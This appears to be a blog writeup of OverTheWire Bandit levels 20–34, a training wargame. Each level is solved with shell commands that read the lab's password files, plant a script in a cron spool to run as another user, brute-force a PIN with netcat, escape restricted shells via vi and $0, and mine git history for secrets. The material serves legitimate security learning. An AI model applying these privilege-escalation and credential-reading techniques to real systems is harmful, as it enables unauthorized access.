---
title: OverTheWire Bandit: Levels 20 to 34
date: 2026-06-29
category: writeup
tags: [linux, ssh, git, wargame]
summary: Finishing Bandit: a setuid network daemon, reading passwords out of cron jobs, brute-forcing a PIN, escaping restricted shells with vi, and a full run through the git-based levels to the final flag.
---

The closing stretch of [Bandit](/blog/overthewire-bandit-11-20) is where the
puzzles start to resemble real tradecraft: abusing scheduled jobs, escaping
locked-down shells, and mining secrets out of a git history.

> By level 34 the tools are familiar; the challenge is chaining them together
> under constraints someone deliberately put in your way.

## Level 20 → 21

The setuid binary `suconnect` connects to a port you control; feed it the current
password and it hands back the next one. Run a listener in the background, then
call the binary:

```bash
echo "$(cat /etc/bandit_pass/bandit20)" | nc -l -p 12345 &
./suconnect 12345
```

## Level 21 → 22

A cron job runs a script that drops the password into `/tmp`. Read the cron
config, then the script it points at, then the file the script writes:

```bash
cat /etc/cron.d/cronjob_bandit22
cat /usr/bin/cronjob_bandit22.sh
cat /tmp/<file-from-the-script>
```

## Level 22 → 23

This cron script derives its target filename from the username. Reproduce the
same calculation for `bandit23` and read the resulting file:

```bash
cat /usr/bin/cronjob_bandit23.sh
echo "I am user bandit23" | md5sum | cut -d ' ' -f 1
cat /tmp/<hash>
```

## Level 23 → 24

A cron job runs every script left in `/var/spool/bandit24/foo/` as `bandit24`,
then deletes it. Drop in a script that copies the password somewhere readable:

```bash
mkdir -p /tmp/w && cd /tmp/w
cat > pass.sh <<'EOF'
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/w/out.txt
chmod 666 /tmp/w/out.txt
EOF
chmod 777 pass.sh /tmp/w
cp pass.sh /var/spool/bandit24/foo/
# wait for the next minute, then:
cat /tmp/w/out.txt
```

## Level 24 → 25

A daemon on port 30002 wants the current password plus a secret 4-digit PIN.
There is no shortcut, so brute-force all 10,000 combinations in one connection:

```bash
for i in $(seq -w 0000 9999); do
  echo "$(cat /etc/bandit_pass/bandit24) $i"
done | nc localhost 30002 | grep -v "Wrong"
```

## Level 25 → 26

`bandit26`'s login shell is not bash; it shows text through `more` and
disconnects. Shrink the terminal window so `more` has to paginate, then press
`v` to open `vi` from the pager:

```bash
ssh -i bandit26.sshkey bandit26@localhost -p 2220
# make the window tiny first, then press: v
```

Inside `vi`, read the password file directly:

```text
:r /etc/bandit_pass/bandit26
```

## Level 26 → 27

Still inside `vi`, set a real shell and drop into it, so now you are `bandit26`
interactively. A setuid helper reads the next password:

```text
:set shell=/bin/bash
:shell
```

```bash
./bandit27-do cat /etc/bandit_pass/bandit27
```

## Level 27 → 28

The password lives in a git repository. Clone it over SSH and read the file:

```bash
cd $(mktemp -d)
git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
cat repo/README
```

## Level 28 → 29

The README was redacted in a later commit, but the secret is still in the history:

```bash
git -C repo log -p
```

## Level 29 → 30

`main` looks empty; the password sits on another branch:

```bash
git -C repo branch -a
git -C repo checkout dev
cat repo/README.md
```

## Level 30 → 31

Nothing in the files or branches, so check the tags:

```bash
git -C repo tag
git -C repo show <tag-name>
```

## Level 31 → 32

Push a file to the repo to trigger a server-side hook that returns the password.
The `.gitignore` blocks `*.txt`, so force-add it:

```bash
echo "May I come in?" > key.txt
git add -f key.txt
git commit -m "push"
git push
```

## Level 32 → 33

The "uppercase shell" converts everything you type to capitals, so most
commands fail. But `$0` expands to the shell itself, giving you a fresh,
normal shell:

```bash
$0
cat /etc/bandit_pass/bandit33
```

## Level 33 → 34

There is no level 34. Logging in as `bandit33` and reading `README.txt` confirms
the game is finished; the wargame ends here.

## Commands worth internalizing

| Command                         | Why it matters                                 |
| ------------------------------- | ---------------------------------------------- |
| `nc -l -p` + setuid binary      | Feeds a local daemon to escalate privilege     |
| `/etc/cron.d/*`                 | Where scheduled jobs (and their scripts) live  |
| `md5sum \| cut`                 | Reproduces a script's derived filename         |
| drop script in spool dir        | Runs your code as the job's owner              |
| `seq -w` + `nc`                 | Brute-forces a numeric secret in one stream    |
| `v` in `more` → `vi`            | Escapes a restricted pager into an editor      |
| `:set shell` + `:shell`         | Breaks out of `vi` into a real shell           |
| `git log -p` / `branch` / `tag` | Mines secrets from every corner of git history |
| `$0`                            | Spawns a clean shell from a mangled one        |

## Takeaway

Bandit ends where offensive work really begins: reading the environment,
noticing what runs automatically and as whom, and turning small
misconfigurations into access. Scheduled jobs, restricted shells, and forgotten
git history are not textbook trivia; they are among the most common footholds on
real engagements. That is the whole point of the game: the reflexes are the
reward.
